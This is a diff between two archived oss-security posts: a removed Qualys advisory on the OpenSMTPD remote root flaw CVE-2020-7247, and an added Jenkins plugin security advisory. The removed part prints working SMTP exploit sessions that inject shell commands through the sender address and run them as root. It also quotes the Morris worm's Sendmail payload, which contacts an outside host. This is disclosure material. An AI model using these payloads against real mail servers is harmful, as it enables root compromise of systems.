@@ -1,256 +1,173 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/01/28/3
-Message-ID: <20200129000550.GD10785@localhost.localdomain>
-Date: Tue, 28 Jan 2020 23:15:20 +0000
-From: Qualys Security Advisory <qsa@...lys.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: LPE and RCE in OpenSMTPD (CVE-2020-7247)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/09/01/3
+Message-Id: <D3E42EB3-B891-4E7D-8F23-B5C551998DB4@beckweb.net>
+Date: Tue, 1 Sep 2020 15:40:11 +0200
+From: Daniel Beck <ml@...kweb.net>
+To: oss-security@...ts.openwall.com
+Subject: Multiple vulnerabilities in Jenkins plugins
 Content-Type: text/plain; charset=utf-8
 
+Jenkins is an open source automation server which enables developers around
+the world to reliably build, test, and deploy their software.
 
-Qualys Security Advisory
+The following releases contain fixes for security vulnerabilities:
 
-LPE and RCE in OpenSMTPD (CVE-2020-7247)
+* Build Failure Analyzer Plugin 1.27.1
+* Cadence vManager Plugin 3.0.5
+* database Plugin 1.7
+* Git Parameter Plugin 0.9.13
+* Parameterized Remote Trigger Plugin 3.1.4
+* SoapUI Pro Functional Testing Plugin 1.4
 
+Additionally, we announce unresolved security issues in the following
+plugins:
 
-==============================================================================
-Contents
-==============================================================================
+* JSGames Plugin
+* Klocwork Analysis Plugin
+* SoapUI Pro Functional Testing Plugin
+* Team Foundation Server Plugin
+* Valgrind Plugin
 
-Summary
-Analysis
-Exploitation
-Acknowledgments
+Summaries of the vulnerabilities are below. More details, severity, and
+attribution can be found here:
+https://www.jenkins.io/security/advisory/2020-09-01/
 
+We provide advance notification for security updates on this mailing list:
+https://groups.google.com/d/forum/jenkinsci-advisories
 
-==============================================================================
-Summary
-==============================================================================
+If you discover security vulnerabilities in Jenkins, please report them as
+described here:
+https://www.jenkins.io/security/#reporting-vulnerabilities
 
-We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This
-vulnerability is exploitable since May 2018 (commit a8e222352f, "switch
-smtpd to new grammar") and allows an attacker to execute arbitrary shell
-commands, as root:
+---
 
-- either locally, in OpenSMTPD's default configuration (which listens on
-  the loopback interface and only accepts mail from localhost);
+SECURITY-1884 / CVE-2020-2238
+Git Parameter Plugin 0.9.12 and earlier does not escape the repository
+field on the 'Build with Parameters' page.
 
-- or locally and remotely, in OpenSMTPD's "uncommented" default
-  configuration (which listens on all interfaces and accepts external
-  mail).
-
-We developed a simple proof of concept and successfully tested it
-against OpenBSD 6.6 (the current release) and Debian testing (Bullseye);
-other versions and distributions may be exploitable.
-
-
-==============================================================================
-Analysis
-==============================================================================
-
-OpenSMTPD's smtp_mailaddr() function is responsible for validating
-sender (MAIL FROM) and recipient (RCPT TO) mail addresses:
-
-------------------------------------------------------------------------------
-2189 static int
-2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
-2191     const char *domain)
-2192 {
-....
-2218         if (!valid_localpart(maddr->user) ||
-2219             !valid_domainpart(maddr->domain)) {
-....
-2234                 return (0);
-2235         }
-2236
-2237         return (1);
-2238 }
-------------------------------------------------------------------------------
-
-- it calls valid_domainpart() to validate the domain name (after the @
-  sign) of a mail address -- this function only accepts IPv4 and IPv6
-  addresses, and alpha-numeric, '.', '-', and '_' characters;
-
-- it calls valid_localpart() to validate the local part (before the @
-  sign) of a mail address -- this function only accepts alpha-numeric,
-  '.', and MAILADDR_ALLOWED characters (a white list from RFC 5322):
-
-  71 #define MAILADDR_ALLOWED        "!#$%&'*/?^`{|}~+-=_"
-
-Among the characters in MAILADDR_ALLOWED, the ones that are also in
-MAILADDR_ESCAPE are later transformed into ':' characters (escaped) by
-mda_expand_token():
-
-  72 #define MAILADDR_ESCAPE         "!#$%&'*?`{|}~"
-
-smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping are
-fundamental to OpenSMTPD's security -- they prevent dangerous characters
-from reaching the shell that executes MDA commands (in mda_unpriv()):
-
-        execle("/bin/sh", "/bin/sh", "-c", mda_command, (char *)NULL,
-            mda_environ);
-
-Mail Delivery Agents (MDAs) are responsible for delivering mail to local
-recipients; for example, OpenSMTPD's default MDA method is "mbox", and
-the corresponding MDA command is (in parse.y):
-
-        asprintf(&dispatcher->u.local.command,
-            "/usr/libexec/mail.local -f %%{mbox.from} %%{user.username}");
-
-where %{user.username} is the name of an existing local user (the local
-part of the recipient address), and %{mbox.from} is the sender address
-(which would be under the complete control of an attacker if it were not
-for smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping).
-
-Unfortunately, we discovered a vulnerability in smtp_mailaddr()
-(CVE-2020-7247):
-
-------------------------------------------------------------------------------
-2189 static int
-2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
-2191     const char *domain)
-2192 {
-....
-2218         if (!valid_localpart(maddr->user) ||
-2219             !valid_domainpart(maddr->domain)) {
-....
-2229                 if (maddr->domain[0] == '\0') {
-2230                         (void)strlcpy(maddr->domain, domain,
-2231                             sizeof(maddr->domain));
-2232                         return (1);
-2233                 }
-2234                 return (0);
-2235         }
-2236
-2237         return (1);
-2238 }
-------------------------------------------------------------------------------
-
-If the local part of an address is invalid (line 2218) and if its domain
-name is empty (line 2229), then smtp_mailaddr() adds the default domain
-automatically (line 2230) and returns 1 (line 2232), although it should
-return 0 because the local part of the address is invalid (for example,
-because it contains invalid characters).
-
-As a result, an attacker can pass dangerous characters that are not in
-MAILADDR_ALLOWED and not in MAILADDR_ESCAPE (';' and ' ' in particular)
-to the shell that executes the MDA command. For example, the following
-local SMTP session executes "sleep 66" as root, in OpenSMTPD's default
-configuration:
-
-------------------------------------------------------------------------------
-$ nc 127.0.0.1 25
-220 obsd66.example.org ESMTP OpenSMTPD
-HELO professor.falken
-250 obsd66.example.org Hello professor.falken [127.0.0.1], pleased to meet you
-MAIL FROM:<;sleep 66;>
-250 2.0.0 Ok
-RCPT TO:<root>
-250 2.1.5 Destination address valid: Recipient ok
-DATA
-354 Enter mail, end with "." on a line by itself
-
-How about a nice game of chess?
-.
-250 2.0.0 e6330998 Message accepted for delivery
-QUIT
-221 2.0.0 Bye
-------------------------------------------------------------------------------
+This results in a stored cross-site scripting (XSS) vulnerability
+exploitable by attackers with Job/Configure permission.
 
 
-==============================================================================
-Exploitation
-==============================================================================
-
-Nevertheless, our ability to execute arbitrary shell commands through
-the local part of the sender address is rather limited:
-
-- although OpenSMTPD is less restrictive than RFC 5321, the maximum
-  length of a local part should be 64 characters;
-
-- the characters in MAILADDR_ESCAPE (for example, '$' and '|') are
-  transformed into ':' characters.
-
-To overcome these limitations, we drew inspiration from the Morris worm
-(https://spaf.cerias.purdue.edu/tech-reps/823.pdf), which exploited the
-DEBUG vulnerability in Sendmail by executing the body of a mail as a
-shell script:
-
-------------------------------------------------------------------------------
-debug
-mail from: </dev/null>
-rcpt to: <"|sed -e '1,/^$/'d | /bin/sh ; exit 0">
-data
-
-cd /usr/tmp
-cat > x14481910.c <<'EOF'
-[text of vector program]
-EOF
-cc -o x14481910 x14481910.c;x14481910 128.32.134.16 32341 8712440;
-rm -f x14481910 x14481910.c
-
-.
-quit
-------------------------------------------------------------------------------
-
-Indeed, the standard input of an MDA command is the mail itself: "sed"
-removes the headers (which were added automatically by the mail server)
-and "/bin/sh" executes the body.
-
-We cannot simply reuse this command (because we cannot use the '|' and
-'>' characters), but we can use "read" to remove N header lines (where N
-is greater than the number of header lines added by the mail server) and
-prepend a "NOP slide" of N comment lines to the body of our mail. For
-example, the following remote SMTP session executes the body of our
-mail, as root, in OpenSMTPD's "uncommented" default configuration:
-
-------------------------------------------------------------------------------
-$ nc 192.168.56.143 25
-220 obsd66.example.org ESMTP OpenSMTPD
-HELO professor.falken
-250 obsd66.example.org Hello professor.falken [192.168.56.1], pleased to meet you
-MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>
-250 2.0.0 Ok
-RCPT TO:<root@...mple.org>
-250 2.1.5 Destination address valid: Recipient ok
-DATA
-354 Enter mail, end with "." on a line by itself
-
-#0
-#1
-#2
-#3
-#4
-#5
-#6
-#7
-#8
-#9
-#a
-#b
-#c
-#d
-for i in W O P R; do
-        echo -n "($i) " && id || break
-done >> /root/x."`id -u`"."$$"
-.
-250 2.0.0 4cdd24df Message accepted for delivery
-QUIT
-221 2.0.0 Bye
-------------------------------------------------------------------------------
+SECURITY-1625 / CVE-2020-2239
+Parameterized Remote Trigger Plugin 3.1.3 and earlier stores a secret
+unencrypted in its global configuration file
+`org.jenkinsci.plugins.ParameterizedRemoteTrigger.RemoteBuildConfiguration.xml`
+on the Jenkins controller as part of its configuration. This secret can be
+viewed by attackers with access to the Jenkins controller file system.
 
 
-==============================================================================
-Acknowledgments
-==============================================================================
+SECURITY-1023 / CVE-2020-2240
+database Plugin 1.6 and earlier does not require POST requests for the
+database console, resulting in a cross-site request forgery (CSRF)
+vulnerability.
 
-We thank the OpenBSD developers for their great work and their quick
-response.
+This vulnerability allows attackers to execute arbitrary SQL scripts.
+
+
+SECURITY-1024 / CVE-2020-2241 (CSRF) & CVE-2020-2242 (permission check)
+database Plugin 1.6 and earlier does not perform a permission check in a
+method implementing form validation.
+
+This allows attackers with Overall/Read access to Jenkins to connect to an
+attacker-specified database server using attacker-specified username and
+password.
+
+Additionally, this form validation method does not require POST requests,
+resulting in a cross-site request forgery (CSRF) vulnerability.
+
+
+SECURITY-1936 / CVE-2020-2243
+Cadence vManager Plugin 3.0.4 and earlier does not escape build
+descriptions in tooltips.
+
+This results in a stored cross-site scripting (XSS) vulnerability
+exploitable by attackers with Run/Update permission.
+
+
+SECURITY-1770 / CVE-2020-2244
+Build Failure Analyzer Plugin 1.27.0 and earlier does not escape matching
+text in a form validation response.
+
+This results in a cross-site scripting (XSS) vulnerability exploitable by
+attackers able to provide console output for builds used to test build log
+indications.
+
+
+SECURITY-1829 / CVE-2020-2245
+Valgrind Plugin 0.28 and earlier does not configure its XML parser to
+prevent XML external entity (XXE) attacks.
+
+This allows a user able to control the input files for the Valgrind plugin
+parser to have Jenkins parse a crafted file that uses external entities for
+extraction of secrets from the Jenkins controller or server-side request
+forgery.  
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1830 / CVE-2020-2246
+Valgrind Plugin 0.28 and earlier does not escape content in Valgrind XML
+reports.
+
+This results in a stored cross-site scripting (XSS) vulnerability
+exploitable by attackers able to control Valgrind XML report contents.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1831 / CVE-2020-2247
+Klocwork Analysis Plugin 2020.2.1 and earlier does not configure its XML
+parser to prevent XML external entity (XXE) attacks.
+
+This allows a user able to control the input files for the Klocwork plugin
+parser to have Jenkins parse a crafted file that uses external entities for
+extraction of secrets from the Jenkins controller or server-side request
+forgery.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1905 / CVE-2020-2248
+JSGames Plugin 0.2 and earlier evaluates part of a URL as code.
+
+This results in a reflected cross-site scripting (XSS) vulnerability.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1506 / CVE-2020-2249
+Team Foundation Server Plugin 5.157.1 and earlier stores a webhook secret
+unencrypted in its global configuration file
+`hudson.plugins.tfs.TeamPluginGlobalConfig.xml` on the Jenkins controller
+as part of its configuration. This secret can be viewed by attackers with
+access to the Jenkins controller file system.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1631 (1) / CVE-2020-2250
+SoapUI Pro Functional Testing Plugin 1.3 and earlier stores project
+passwords unencrypted in job `config.xml` files as part of its
+configuration. These project passwords can be viewed by attackers with
+Extended Read permission or access to the Jenkins controller file system.
+
+
+SECURITY-1631 (2) / CVE-2020-2251
+SoapUI Pro Functional Testing Plugin stores project passwords in job
+`config.xml` files on the Jenkins controller as part of its configuration.
+
+While these passwords are stored encrypted on disk since SoapUI Pro
+Functional Testing Plugin 1.4, they are transmitted in plain text as part
+of the global configuration form by SoapUI Pro Functional Testing Plugin
+1.5 and earlier. These passwords can be viewed by attackers with Extended
+Read permission.
+
+This only affects Jenkins before 2.236, including 2.235.x LTS, as Jenkins
+2.236 introduces a security hardening that transparently encrypts and
+decrypts data used for a Jenkins password form field.
+
+As of publication of this advisory, there is no fix.
 
 
 
-[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
-
-
-
-This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.
